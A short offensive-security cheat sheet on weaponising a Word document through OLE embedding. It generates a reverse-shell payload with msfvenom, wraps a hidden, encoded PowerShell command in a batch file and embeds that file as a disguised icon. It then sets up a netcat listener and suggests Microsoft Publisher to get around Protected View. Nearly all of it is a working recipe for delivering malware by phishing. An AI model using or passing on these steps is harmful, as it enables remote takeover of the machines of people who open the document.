## OLE
### OLE

Object Linking and Embedding - Embed a Windows Batch file in a Microsoft Word Document.

```
# Cat evil.hta and Copy the Powershell string only base 64 encoded strings.
1) msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f hta-psh -o evil.hta

# On Windows, open the terminal and put the PowerShell string
2) START <powershell.exe -nop -w hidden -e ..... > launch.bat

3) Open Word Document -> Insert -> Object (In right side Taskbar) -> Create from File 
-> Location of bat file from above -> Select Display as icon (Change appearance - Optional)
-> OK -> Save as Word 97-2003 Document.

# Start a nc listener
nc -nlvp <PORT>

-> Wait for the attacker to open Word and double-click the Object.
```

```
# Above one works well when served Locally, but if we provide it through email or server,
# We need to bypass Protected View protection which can disable Macros/Objects.
# Use Microsoft Publisher Instead of Microsoft Word document to bypass it.
# Downside is, it's not installed on most systems.
```